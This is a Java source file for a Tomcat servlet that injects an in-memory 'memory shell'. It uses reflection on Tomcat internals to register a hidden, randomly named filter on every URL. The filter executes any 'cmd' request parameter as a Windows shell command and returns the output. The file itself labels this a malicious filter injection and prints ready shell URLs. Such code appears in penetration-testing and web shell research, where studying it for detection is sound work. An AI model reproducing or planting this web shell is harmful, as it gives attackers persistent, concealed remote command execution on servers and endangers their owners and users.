import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.*;

@WebServlet("/InjectFilterServlet")
public class InjectFilterServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            ServletContext servletContext = request.getSession().getServletContext();

            // 通过反射获取 StandardContext
            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

            // 访问 StandardContext 内部的 filterConfigs
            Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);
            Map<String, ApplicationFilterConfig> filterConfigs = (Map<String, ApplicationFilterConfig>) filterConfigsField.get(standardContext);

            String filterName = getRandomString();
            if (!filterConfigs.containsKey(filterName)) {
                // 创建动态 Filter
                Filter filter = new Filter() {
                    @Override
                    public void init(FilterConfig filterConfig) {
                    }

                    @Override
                    public void destroy() {
                    }

                    @Override
                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)
                            throws IOException, ServletException {
                        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
                        String cmd = httpServletRequest.getParameter("cmd");
                        if (cmd != null) {
                            Process process = Runtime.getRuntime().exec("cmd /c " + cmd);
                            InputStream in = process.getInputStream();
                            Scanner scanner = new Scanner(in, "GBK").useDelimiter("\\A");
                            String output = scanner.hasNext() ? scanner.next() : "";
                            servletResponse.setCharacterEncoding("GBK");
                            PrintWriter out = servletResponse.getWriter();
                            out.println(output);
                            out.flush();
                            out.close();
                        }
                        filterChain.doFilter(servletRequest, servletResponse);
                    }
                };

                // 创建 FilterDef
                FilterDef filterDef = new FilterDef();
                filterDef.setFilterName(filterName);
                filterDef.setFilterClass(filter.getClass().getName());
                filterDef.setFilter(filter);
                standardContext.addFilterDef(filterDef);

                // 创建 FilterMap
                FilterMap filterMap = new FilterMap();
                filterMap.setFilterName(filterName);
                filterMap.addURLPattern("/*");
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(filterMap);

                // 通过反射创建 ApplicationFilterConfig 并加入 filterConfigs
                Constructor<ApplicationFilterConfig> constructor =
                        ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig applicationFilterConfig =
                        constructor.newInstance(standardContext, filterDef);
                filterConfigs.put(filterName, applicationFilterConfig);

                // 输出结果
                response.setContentType("text/html; charset=UTF-8");
                PrintWriter out = response.getWriter();
                out.println("[+] Malicious filter injection successful!<br>");
                out.println("[+] Filter name: " + filterName + "<br>");
                out.println("[+] Below is a list displaying filter names and their corresponding URL patterns:");
                out.println("<table border='1'><tr><th>Filter Name</th><th>URL Patterns</th></tr>");

                List<String[]> allUrlPatterns = new ArrayList<>();
                for (ApplicationFilterConfig filterConfigObj : filterConfigs.values()) {
                    String name = filterConfigObj.getFilterName();
                    FilterDef filterDefObj = standardContext.findFilterDef(name);
                    if (filterDefObj != null) {
                        FilterMap[] filterMaps = standardContext.findFilterMaps();
                        for (FilterMap filterMapObj : filterMaps) {
                            if (filterMapObj.getFilterName().equals(name)) {
                                String[] urlPatterns = filterMapObj.getURLPatterns();
                                allUrlPatterns.add(urlPatterns);

                                out.println("<tr><td>" + name + "</td>");
                                out.println("<td>" + String.join(", ", urlPatterns) + "</td></tr>");
                            }
                        }
                    }
                }
                out.println("</table>");

                for (String[] urlPatterns : allUrlPatterns) {
                    for (String pattern : urlPatterns) {
                        if (!pattern.equals("/*")) {
                            out.println("[+] shell: http://localhost:8080/test" + pattern + "?cmd=ipconfig<br>");
                        }
                    }
                }
            }
        } catch (Exception e) {
            throw new ServletException("Error injecting filter", e);
        }
    }

    private String getRandomString() {
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        StringBuilder randomString = new StringBuilder();
        for (int i = 0; i < 8; i++) {
            int index = (int) (Math.random() * characters.length());
            randomString.append(characters.charAt(index));
        }
        return randomString.toString();
    }
}